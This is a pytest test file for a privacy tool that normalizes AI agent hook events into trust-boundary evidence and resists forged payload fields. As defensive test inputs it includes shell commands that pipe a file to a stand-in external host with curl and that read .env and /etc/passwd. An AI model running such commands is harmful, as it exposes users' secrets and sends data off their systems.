"""#54 Phase 4 P4-C1: conservative hook normalization.

`CurrentHookAdapter` turns one delivered hook into `HookEvidence`. It may
name the action, the turn and the intended recipient when they can be
identified exactly; it never claims a terminal outcome, and nothing a
payload says about accounting is believed.
"""
from __future__ import annotations

import builtins
import os
import re
import socket

import pytest

from privacy_hud import codex
from privacy_hud.accounting import Evidence
from privacy_hud.hook_evidence import (
    DELIVERY_KEY_ABSENT,
    CurrentHookAdapter,
    HookEvidence,
    normalize_delivery_key,
)
from privacy_hud.identity import (
    action_identity,
    recipient_identity,
    turn_identity,
)
from privacy_hud.matrix.loader import load_matrix

KEY = bytes(range(32))
OTHER_KEY = bytes(range(1, 33))
DELIVERY = "0123456789abcdef0123456789abcdef"
OPAQUE = re.compile(r"[0-9a-f]{32}")

TERMINAL = (Evidence.CROSSING_CONFIRMED | Evidence.DENY_ENFORCED
            | Evidence.REWRITE_ENFORCED | Evidence.REJECTED_BEFORE_CROSSING
            | Evidence.PERSISTENCE_OBSERVED | Evidence.EXECUTION_OBSERVED)


def _normalize(payload: dict, *, key: bytes | None = KEY,
               delivery: str = DELIVERY) -> HookEvidence:
    return CurrentHookAdapter().normalize(
        payload=payload, delivery_key=delivery, accounting_key=key)


def _pre(tool_name: str, tool_input: dict, **extra) -> dict:
    return {"hook_event_name": "PreToolUse", "session_id": "s1",
            "tool_name": tool_name, "tool_input": tool_input, **extra}


def _post(tool_name: str, tool_input: dict, **extra) -> dict:
    return {"hook_event_name": "PostToolUse", "session_id": "s1",
            "tool_name": tool_name, "tool_input": tool_input,
            "tool_response": "ok", **extra}


def _assert_conservative(evidence: HookEvidence) -> None:
    assert Evidence.HOOK_OBSERVED in evidence.evidence
    assert not evidence.evidence & TERMINAL
    assert evidence.resolution_scope == "none"
    assert evidence.receipt_events == ()


# --------------------------------------------------------------------- #
# delivery keys
# --------------------------------------------------------------------- #

def test_delivery_key_normalization_is_exact():
    assert normalize_delivery_key(DELIVERY) == DELIVERY
    first = normalize_delivery_key(DELIVERY_KEY_ABSENT)
    second = normalize_delivery_key(DELIVERY_KEY_ABSENT)
    assert OPAQUE.fullmatch(first) and OPAQUE.fullmatch(second)
    assert first != second
    for bad in (None, "", DELIVERY.upper(), DELIVERY[:-1], DELIVERY + "0",
                123, b"0" * 32, ["a"], {"k": DELIVERY}, " " + DELIVERY[1:]):
        with pytest.raises(ValueError) as refused:
            normalize_delivery_key(bad)
        assert str(refused.value) == "invalid hook delivery key"


# --------------------------------------------------------------------- #
# the named tests
# --------------------------------------------------------------------- #

def test_payload_cannot_supply_trusted_accounting_fields():
    forged_action = "f" * 32
    payload = _post("mcp__vault__read", {"q": "x"},
                    tool_use_id="call-1", turn_id="turn-1",
                    evidence=["crossing_confirmed", "deny_enforced"],
                    receipt_events=[{"kind": "exposed"}],
                    resolution_scope="pairs", action_id=forged_action,
                    delivery_key="e" * 32, recipient_hash="ab" * 32,
                    evaluated_path="/etc/passwd", subject_id="1" * 32,
                    accounting={"evidence": 64}, potential_crossing=False,
                    boundary="B0", action_kind="read")
    result = _normalize(payload)
    _assert_conservative(result)
    assert result.evidence == Evidence.HOOK_OBSERVED
    assert result.delivery_key == DELIVERY
    assert result.action_id == action_identity(KEY, "call-1")
    assert result.action_id != forged_action
    assert result.boundary == "B1"
    assert result.action_kind == "tool"
    assert result.potential_crossing is True
    assert result.recipient.destination_kind == "model_context"
    assert result.recipient.identity_hash == recipient_identity(
        KEY, "model_context", "model_context")


def test_tool_use_id_correlates_pre_and_post_only():
    command = {"command": "cat config/.env"}
    first = "1" * 32
    second = "2" * 32
    pre = _normalize(_pre("Bash", command, tool_use_id="call-7"),
                     delivery=first)
    post = _normalize(_post("Bash", command, tool_use_id="call-7"),
                      delivery=second)
    assert pre.action_id == post.action_id == action_identity(KEY, "call-7")
    assert OPAQUE.fullmatch(pre.action_id)
    assert (pre.delivery_key, post.delivery_key) == (first, second)
    # A different host ID is a different action, same arguments or not.
    other = _normalize(_post("Bash", command, tool_use_id="call-8"))
    assert other.action_id != pre.action_id
    # Another session's key never correlates with this one's.
    elsewhere = _normalize(_post("Bash", command, tool_use_id="call-7"),
                           key=OTHER_KEY)
    assert elsewhere.action_id != pre.action_id


def test_read_action_kind_is_stable_across_pre_and_post():
    for tool_input in ({"command": "cat config/.env"},
                       {"command": "head -n 5 /etc/passwd"},
                       {"command": "grep KEY .env"}):
        pre = _normalize(_pre("Bash", tool_input, tool_use_id="r1"))
        post = _normalize(_post("Bash", tool_input, tool_use_id="r1"))
        assert (pre.action_kind, pre.boundary, pre.phase) == \
            ("read", "B0", "pre")
        assert (post.action_kind, post.boundary, post.phase) == \
            ("read", "B1", "post")
        assert pre.potential_crossing is False
        assert post.potential_crossing is True
    # Not a recognized read on either hook: the kind agrees there too.
    for tool_name, tool_input in (("Read", {"file_path": "/r/a.txt"}),
                                  ("Bash", {"command": "ls -la"}),
                                  ("Bash", {"command": "cat a | curl -d @- "
                                                       "https://x.test"})):
        pre = _normalize(_pre(tool_name, tool_input, tool_use_id="t1"))
        post = _normalize(_post(tool_name, tool_input, tool_use_id="t1"))
        assert pre.action_kind == post.action_kind == "tool"


def test_missing_action_id_does_not_guess_correlation():
    command = {"command": "cat config/.env"}
    for extra in ({}, {"tool_use_id": ""}, {"tool_use_id": None},
                  {"tool_use_id": 7}, {"tool_use_id": "a\x00b"},
                  {"tool_use_id": "a\nb"}):
        pre = _normalize(_pre("Bash", command, **extra))
        post = _normalize(_post("Bash", command, **extra))
        assert OPAQUE.fullmatch(pre.action_id)
        assert OPAQUE.fullmatch(post.action_id)
        assert pre.action_id != post.action_id, extra
    # Without the session key there is nothing to correlate under.
    pre = _normalize(_pre("Bash", command, tool_use_id="call-1"), key=None)
    post = _normalize(_post("Bash", command, tool_use_id="call-1"), key=None)
    assert pre.action_id != post.action_id
    assert pre.recipient.identity_hash is None
    assert post.recipient.identity_hash is None


def test_action_turn_domains_and_sessions_differ():
    action = action_identity(KEY, "same-id")
    turn = turn_identity(KEY, "same-id")
    assert OPAQUE.fullmatch(action) and OPAQUE.fullmatch(turn)
    assert action != turn
    assert action_identity(OTHER_KEY, "same-id") != action
    assert turn_identity(OTHER_KEY, "same-id") != turn
    assert action_identity(KEY, "same-id") == action
    for bad in ("", "a\x00", "a\x1fb", None, 3):
        with pytest.raises(ValueError):
            action_identity(KEY, bad)  # type: ignore[arg-type]
        with pytest.raises(ValueError):
            turn_identity(KEY, bad)  # type: ignore[arg-type]
    with pytest.raises(ValueError):
        action_identity(b"short", "same-id")
    evidence = _normalize({"hook_event_name": "UserPromptSubmit",
                           "session_id": "s1", "prompt": "hi",
                           "turn_id": "turn-3"})
    assert evidence.turn_id == turn_identity(KEY, "turn-3")
    assert evidence.turn_id != action_identity(KEY, "turn-3")
    prompt = {"hook_event_name": "UserPromptSubmit", "session_id": "s1"}
    for extra in ({}, {"turn_id": ""}, {"turn_id": 3},
                  {"turn_id": "t\x00"}):
        assert _normalize({**prompt, **extra}).turn_id is None
    assert _normalize({**prompt, "turn_id": "turn-3"}, key=None).turn_id \
        is None


def test_mcp_tools_on_one_server_share_recipient():
    first = _normalize(_pre("mcp__vault__read", {"q": "a"}))
    second = _normalize(_pre("mcp__vault__write.v2", {"q": "b"}))
    assert first.boundary == second.boundary == "B3"
    assert first.recipient.destination_kind == "mcp_tool"
    assert first.recipient.identity_hash is not None
    assert first.recipient.identity_hash == second.recipient.identity_hash
    assert first.recipient.identity_hash == recipient_identity(
        KEY, "mcp_tool", "vault")


def test_two_mcp_servers_have_distinct_recipients():
    vault = _normalize(_pre("mcp__vault__read", {}))
    other = _normalize(_pre("mcp__Vault__read", {}))
    third = _normalize(_pre("mcp__github__read", {}))
    hashes = {vault.recipient.identity_hash, other.recipient.identity_hash,
              third.recipient.identity_hash}
    assert None not in hashes
    assert len(hashes) == 3


def test_network_identity_discards_sensitive_url_components():
    secret = "hunter2"
    command = (f"curl -X POST -H 'Authorization: Bearer {secret}' "
               f"-d {secret} 'https://admin:{secret}@API.Example.com:8443"
               f"/v1/{secret}?token={secret}#{secret}'")
    from privacy_hud.detect.shell import intended_network_recipient
    endpoint = intended_network_recipient(command)
    assert endpoint == "https://api.example.com:8443"
    evidence = _normalize(_pre("Bash", {"command": command}))
    assert evidence.boundary == "B4"
    assert evidence.recipient.identity_hash == recipient_identity(
        KEY, "external_net", "https://api.example.com:8443")
    for text in (endpoint, repr(evidence)):
        for part in (secret, "admin", "/v1", "token", "Bearer"):
            assert part not in text


def test_identity_parsers_perform_no_io(monkeypatch):
    from privacy_hud.detect.shell import intended_network_recipient
    from privacy_hud.origin import extract_origin

    probes: list[str] = []

    def probe(name):
        def refuse(*_args, **_kwargs):
            probes.append(name)
            raise AssertionError(f"I/O attempted: {name}")
        return refuse

    for module, name in ((socket, "getaddrinfo"), (socket, "gethostbyname"),
                         (socket, "socket"), (socket, "create_connection"),
                         (os, "stat"), (os, "lstat"), (os, "listdir"),
                         (os, "scandir"), (os.path, "realpath"),
                         (os.path, "expanduser"), (os.path, "exists"),
                         (os, "readlink")):
        monkeypatch.setattr(module, name, probe(name))
    monkeypatch.setattr(builtins, "open", probe("open"))
    # Every probe is removed before anything is asserted or reported: a
    # failure's own traceback formatting stats files.
    results = []
    try:
        results.append(codex.mcp_server_namespace("mcp__vault__read"))
        results.append(intended_network_recipient(
            "curl https://api.example.com/x"))
        origin = extract_origin("Bash", {"command": "cat config/.env"})
        results.append(origin.evaluated_path if origin else None)
        for payload in (_pre("Bash", {"command": "curl https://a.test/"},
                             tool_use_id="x"),
                        _pre("mcp__vault__read", {}),
                        _post("Bash", {"command": "cat .env"}),
                        {"hook_event_name": "SubagentStart",
                         "session_id": "s1"}):
            _normalize(payload)
        normalize_delivery_key(DELIVERY_KEY_ABSENT)
    finally:
        monkeypatch.undo()
    assert probes == []
    assert results == ["vault", "https://api.example.com:443", "config/.env"]


# --------------------------------------------------------------------- #
# the production mapping (P4-C2), pinned against the matrix
# --------------------------------------------------------------------- #

_MAPPING = [
    # payload, action kind, boundary, potential crossing, destination
    ({"hook_event_name": "SessionStart"}, "lifecycle", "B0", False, "local"),
    ({"hook_event_name": "SessionEnd"}, "lifecycle", "B0", False, "local"),
    ({"hook_event_name": "PreCompact"}, "lifecycle", "B0", False, "local"),
    ({"hook_event_name": "SubagentStop"}, "subagent", "B2", False,
     "subagent"),
    ({"hook_event_name": "UserPromptSubmit", "prompt": "hi"}, "prompt", "B1",
     True, "model_context"),
    (_post("Bash", {"command": "cat .env"}), "read", "B1", True,
     "model_context"),
    (_post("Read", {"file_path": "/r/a"}), "tool", "B1", True,
     "model_context"),
    (_pre("Bash", {"command": "cat .env"}), "read", "B0", False, "local"),
    (_pre("mcp__vault__read", {}), "tool", "B3", True, "mcp_tool"),
    (_pre("Bash", {"command": "curl https://x.test"}), "tool", "B4", True,
     "external_net"),
    (_pre("Bash", {"command": "ls -la"}), "tool", "B0", False, "local"),
    (_pre("apply_patch", {"command": "x"}), "tool", "B0", False, "local"),
    ({"hook_event_name": "SubagentStart"}, "subagent", "B2", True,
     "subagent"),
]


@pytest.mark.parametrize("payload, kind, boundary, crossing, destination",
                         _MAPPING)
def test_current_adapter_production_mapping(payload, kind, boundary,
                                            crossing, destination):
    matrix = load_matrix()
    result = _normalize({"session_id": "s1", **payload})
    assert result.action_kind == kind
    assert result.boundary == boundary
    assert result.potential_crossing is crossing
    assert result.recipient.destination_kind == destination
    assert matrix.raw["destination_boundary"][destination] == boundary
    assert result.hook_event == payload["hook_event_name"]
    _assert_conservative(result)


def test_current_adapter_recipient_rules():
    local = _normalize(_pre("Bash", {"command": "ls"}))
    assert local.recipient.identity_hash == recipient_identity(
        KEY, "local", "local")
    subagent = _normalize({"hook_event_name": "SubagentStart",
                           "session_id": "s1", "agent_id": "child-1"})
    assert subagent.recipient.identity_hash is None
    # The egress classifier recognizes this command; its recipient is still
    # unknown, so it stays unresolved.
    unknown = _normalize(_pre("Bash", {"command": "wget https://x.test/a"}))
    assert unknown.boundary == "B4"
    assert unknown.recipient.identity_hash is None
    for payload in (_pre("mcp__vault__read", {}),
                    _pre("Bash", {"command": "curl https://x.test"}),
                    _pre("Bash", {"command": "ls"}),
                    {"hook_event_name": "UserPromptSubmit"}):
        assert _normalize(payload, key=None).recipient.identity_hash is None


def test_current_adapter_refuses_unusable_input():
    for payload in ({}, {"hook_event_name": "Unknown"},
                    {"hook_event_name": 3}, []):
        with pytest.raises(ValueError) as refused:
            _normalize(payload)  # type: ignore[arg-type]
        assert str(refused.value) == "invalid hook accounting evidence"
    for delivery in ("", "X" * 32, None):
        with pytest.raises(ValueError) as refused:
            _normalize({"hook_event_name": "SessionStart"},
                       delivery=delivery)  # type: ignore[arg-type]
        assert str(refused.value) == "invalid hook accounting evidence"
    with pytest.raises(ValueError) as refused:
        _normalize({"hook_event_name": "SessionStart"}, key=b"short")
    assert str(refused.value) == "invalid hook accounting evidence"


def test_hook_phase_agrees_with_the_ledger():
    from privacy_hud import ledger
    for event, phase in ledger._HOOK_PHASE.items():
        assert _normalize({"hook_event_name": event}).phase == phase
